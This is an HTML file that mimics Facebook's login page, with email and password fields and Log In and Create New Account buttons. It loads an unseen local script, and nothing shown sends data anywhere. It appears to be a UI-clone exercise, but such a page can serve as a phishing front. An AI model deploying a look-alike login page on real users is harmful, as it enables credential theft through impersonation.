<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Facebook - Log In or Sign Up</title>
  <!--Bootstrap-->
  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css"
  
    integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">

  <!--Fontawesome CDN link-->
  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
  <!--External CSS StyleSheet-->
  <link rel="stylesheet" href="/style.css">
</head>

<body>

  <div class="facebook">
    <div class="view">
      <div class="container">
        <!--Row-->
        <div class="row">
          <!--Column 1-->
          <div class="col title-div">
            <div>
              <h1 class="text-primary">facebook</h1>
              <p>Facebook helps you connect and share with the people in your life.</p>
            </div>
          </div>
          <!--Column 2-->
          <div class="col-sm-5">
            <div class="card">
              <div>
                <input id="email" class="input-group" type="text" placeholder="Email or Phone Number">
                <input id="pass" class="input-group my-2" type="password" placeholder="Password">
                <button id="fbLogin" class="btn btn-primary btn-lg" style="width:100%;">Log In</button>
                <hr id="hr1">
                <p id="forgetPass1" class="text-center my-3" style="font-size: 14px;"><a href="forget-pw.html">Forget account?</a>
                </p>
              </div>
              <hr id="hr2">
              <button id="createAcBtn" class="btn btn-success btn-lg">Create New Account</button>
              <p id="forgetPass2" class="text-center my-3"><a href="forget-pw.html">Forget account?</a></p>
            </div>
            <p id="form-footer" class="text-center my-4" style="font-size: 14px;"><b>Create a Page</b> for a celebrity,
              brand or business.
            </p>
          </div>
          <!--Row End-->
        </div>
      </div>
    </div>
  </div>

 <script src="/script.js"></script>
</body>

</html>
